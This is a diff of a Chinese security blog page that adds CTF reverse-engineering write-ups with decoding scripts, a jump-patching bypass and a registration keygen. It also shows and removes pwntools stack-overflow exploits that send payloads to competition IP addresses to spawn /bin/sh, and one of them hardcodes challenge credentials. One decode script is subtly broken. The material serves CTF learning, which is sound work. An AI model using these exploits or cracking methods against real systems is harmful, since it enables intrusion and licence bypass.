@@ -202,6 +202,89 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-实验吧-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/22/实验吧-1/" class="article-date">
+      <time datetime="2018-10-22T14:37:21.000Z" itemprop="datePublished">2018-10-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/22/实验吧-1/">实验吧-1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="证明自己吧"><a href="#证明自己吧" class="headerlink" title="证明自己吧"></a>证明自己吧</h1><p>ida打开，定位到关键函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  v5 = dword_40708C;</span><br><span class="line">  v6 = dword_407090;</span><br><span class="line">  v8 = word_407098;</span><br><span class="line">  v9 = byte_40709A;</span><br><span class="line">  v7 = dword_407094;</span><br><span class="line">  if ( strlen(a1) == strlen((const char *)&amp;v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = 0;</span><br><span class="line">    if ( strlen(a1) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">        a1[v1++] ^= 0x20u;</span><br><span class="line">      while ( v1 &lt; strlen(a1) );</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = 0;</span><br><span class="line">    if ( strlen((const char *)&amp;v5) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">        *((_BYTE *)&amp;v5 + v2++) -= 5;</span><br><span class="line">      while ( v2 &lt; strlen((const char *)&amp;v5) );</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = 0;</span><br><span class="line">    if ( strlen((const char *)&amp;v5) == 0 )</span><br><span class="line">      return 1;</span><br><span class="line">    while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( ++v3 &gt;= strlen((const char *)&amp;v5) )</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可知flag的长度和v5相等，flag每位与0x20异或，v5每位减5之后，flag[i]=v5[i]。</p>
+<p>逆运算脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,6]</span><br><span class="line">temp=[]</span><br><span class="line">for i in v5:</span><br><span class="line">	i-=5</span><br><span class="line">	i^=0x20</span><br><span class="line">	key.append(i)</span><br><span class="line">flag=&apos;&apos;.join([chr(i) for i in temp])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+<h1 id="NSCTF-Reverse-500"><a href="#NSCTF-Reverse-500" class="headerlink" title="NSCTF Reverse 500"></a>NSCTF Reverse 500</h1><p>pyc文件直接在线反编译一波：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;M,\x1d-\x18&#125;E&apos;\x1ezN~\x1b*\x19+\x12%\x1d-&quot; + &apos;I\x7fM(I&#123;I\x7fJ.\x16wWcRj\x0e6\x0fn&apos; + &apos;Zo\nn\x0fk\t1R7\x03g\x067\x00eUb\x043&apos; + &apos;\x014\x071Rr\x14x\x19~D?q&quot;a5s,A%&apos; + &quot;\x10&apos;\x11uLyA%\x1d|DrFv\x12t\x11#B&amp;&quot; + &apos;GsKzK*O)\x1c%GuC&gt;\x1e\x7f\x1b+\x19*&apos; + &apos;\x1e&amp;\x14-\x1f/\x1axAqBq@yO-LtE&#125;&apos; + &apos;\x1b,MuBp\x12&apos;</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import cStringIO</span><br><span class="line">import string</span><br><span class="line">import dis</span><br><span class="line">import marshal</span><br><span class="line">import types</span><br><span class="line">import random</span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line">def reverse(string):</span><br><span class="line">    return string[::-1]</span><br><span class="line"></span><br><span class="line">data_list = list(reverse(data)[1:])</span><br><span class="line"></span><br><span class="line">def decrpyt(c, key2):</span><br><span class="line">    global count</span><br><span class="line">    data_list[count] = c ^ key2</span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag1():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 8])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 3])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag2():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 11])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 4 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag3():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 5])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 2 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag4():</span><br><span class="line">    global count</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 1])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 1 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    count = 0</span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag5():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 9])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">            key = struct.unpack(&apos;B&apos;, data[len(data) - 3 - count])[0]</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    for c in data_list[::-12]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">GetFlag1()</span><br></pre></td></tr></table></figure>
+<p>直接运行一波，发现会对data进行报错，百度后发现时在反编译时，例如<code>0f aa</code>这样的指令时会变成<code>\xfa\xa*</code>这样，就会导致错位⽽而解不出flag。</p>
+<p>这时可以用winhex打开pyc文件，找到data，然后自己进行转换就行了，data用十六进制表示为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4D2C1D2D 187D4527 1E7A4E7E 1B2A192B 12251D2D 73140000 00497F4D 28497B49 7F4A2E16 77576352 6A0E360F 6E731400 00005A6F 0A6E0F6B 09315237 03670637 00655562 04337314 00000001 34073152 72147819 7E443F71 22613573 2C412573 14000000 10271175 4C794125 1D7C4472 46761274 11234226 73140000 0047734B 7A4B2A4F 291C2547 75433E1E 7F1B2B19 2A731400 00001E26 142D1F2F 1A784171 42714079 4F2D4C74 457D7307 0000001B 2C4D7542 7012</span><br></pre></td></tr></table></figure>
+<p>然而运行后得不到flag，不过这里定义了5个getflag函数，一个个尝试后在getflag4时找到了flag。</p>
+<h1 id="NSCTF-Reverse-400"><a href="#NSCTF-Reverse-400" class="headerlink" title="NSCTF Reverse 400"></a>NSCTF Reverse 400</h1><p>py2exe的逆向，参考<a href="https://www.cnblogs.com/pcat/p/8990482.html" target="_blank" rel="noopener">PyInstaller Extractor安装和使用方法</a></p>
+<p>在reverse03里找到了一些代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">data=\&quot;\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b&quot;+\&quot;\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72&quot;+\&quot;\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b&quot;</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">char buf[] = &quot;flag:&#123;NSCTF_md5098f6bcd4621d373cade4e832627b4f6&#125;&quot;;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;%d\n&quot;, strlen(buf));</span><br><span class="line">	char key = &apos;\x0b&apos;;</span><br><span class="line">	buf[47] ^= key;</span><br><span class="line">	for (int i = 1; i &lt; 48; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[48 - i - 1] ^= buf[48 - i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">print &quot;Revese it?????????&quot;</span><br></pre></td></tr></table></figure>
+<p>直接就给出了flag，然而并不正确，看来给了一段c的代码是要用到的。</p>
+<p>后发现对data进行如c代码的运算后就可以得到flag，逆运算脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">data=&quot;\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b&quot;+&quot;\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72&quot;+&quot;\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b&quot;</span><br><span class="line">temp=list(data)</span><br><span class="line">for i in range(0,len(temp)-2):</span><br><span class="line">	temp[i]=chr(ord(temp[i])^ord(temp[i+1]))</span><br><span class="line">temp[47]=chr(ord(temp[47])^0x0b)</span><br><span class="line">flag=&apos;&apos;.join(i for i in temp)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+<h1 id="bin100-ebCTF-2013"><a href="#bin100-ebCTF-2013" class="headerlink" title="bin100(ebCTF 2013)"></a>bin100(ebCTF 2013)</h1><p>一个掷🎲小游戏，掷出需要的数字就能得到flag。</p>
+<p>用od打开，字符串搜索，定位到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040192B     /75 5E         jnz short Dice.0040198B</span><br><span class="line">0040192D   . |C74424 04 1F4&gt;mov dword ptr ss:[esp+0x4],Dice.0044421F ;  [*] You rolled a three! Good!</span><br></pre></td></tr></table></figure>
+<p>可见这里就是判断掷出的🎲是不是需要的数字，如果不是的话，jnz就会使得进程跳到失败，所以把jnz这一句nop掉就可以跳过判断，使程序认为掷出了需要的数字，后面还有四个一样的地方，也nop掉之后f9运行程序，回车掷完🎲之后，f8往下运行就可以得到flag。</p>
+<h1 id="该题不简单"><a href="#该题不简单" class="headerlink" title="该题不简单"></a>该题不简单</h1><p>一开始没仔细看题目，以为成功登陆就可以得到flag…后来发现是要找到对应用户名hello的注册码，还是用ida打开看看吧。</p>
+<p>文本搜索一下无效，找到了关键函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">String[0] = 0;</span><br><span class="line">memset(&amp;String[1], 0, 0x1Cu);</span><br><span class="line">v3 = 0;</span><br><span class="line">v4 = 0;</span><br><span class="line">String1 = 0;</span><br><span class="line">memset(&amp;v10, 0, 0x1Cu);</span><br><span class="line">v11 = 0;</span><br><span class="line">v12 = 0;</span><br><span class="line">String2 = 0;</span><br><span class="line">memset(&amp;v6, 0, 0x1Cu);</span><br><span class="line">v7 = 0;</span><br><span class="line">v8 = 0;</span><br><span class="line">if ( GetDlgItemTextA(hDlg, 1000, String, 16) &lt; 5 )</span><br><span class="line">  return 1;</span><br><span class="line">GetDlgItemTextA(hDlg, 1001, &amp;String1, 16);</span><br><span class="line">v1 = 0;</span><br><span class="line">if ( strlen(String) != 0 )</span><br><span class="line">&#123;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;String2 + v1) = (v1 + v1 * String[v1] * String[v1]) % 0x42 + 33;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v1 &lt; strlen(String) );</span><br><span class="line">&#125;</span><br><span class="line">strcpy(String, &quot;Happy@&quot;);</span><br><span class="line">lstrcatA(String, &amp;String2);</span><br><span class="line">return lstrcmpA(&amp;String1, String) != 0;</span><br></pre></td></tr></table></figure>
+<p>如果这个函数返回1的话就是注册码正确了。<br>输入用户名后，<code>注册码[i]=i+i*用户名[i]*用户名[i]%0x42+33</code>，再在前面加上Happy@就得到注册码了。</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;hello&quot;</span><br><span class="line">string2=&quot;&quot;</span><br><span class="line">for i in range(len(username)):</span><br><span class="line">	string2+=chr(i+i*ord(username[i])*ord(username[i])%0x42 +33)</span><br><span class="line">print &quot;Happy@&quot;+string2</span><br></pre></td></tr></table></figure>
+<p>这样的明文密码用od调试应该会更快一点，可以直接看到注册码是什么。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-geek-no-gdb" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -771,67 +854,6 @@
 <p>脚本如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&apos;182.254.217.142&apos;,10001)</span><br><span class="line">sh.recvuntil(&apos;your choice:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;you can leave some message here:&apos;)</span><br><span class="line">payload=&apos;/bin/sh\0&apos;+&apos;a&apos;*40</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;your name please:&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>随后按照题目提示进入目录cat flag即可</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-十一欢乐赛-pwn4" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/03/十一欢乐赛-pwn4/" class="article-date">
-      <time datetime="2018-10-03T09:19:05.000Z" itemprop="datePublished">2018-10-03</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/03/十一欢乐赛-pwn4/">十一欢乐赛-pwn4</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>有system函数 无/bin/sh字符串</p>
-<p>首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,<br>之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。</p>
-<p>因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。</p>
-<p>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10009)</span><br><span class="line">sh.recvuntil(&apos;username: &apos;)</span><br><span class="line">sh.sendline(&apos;admin&apos;)</span><br><span class="line">sh.recvuntil(&apos;password: &apos;)</span><br><span class="line">sh.sendline(&apos;T6OBSh2i&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>随后cat flag即可得到flag</p>
 
       
     </div>
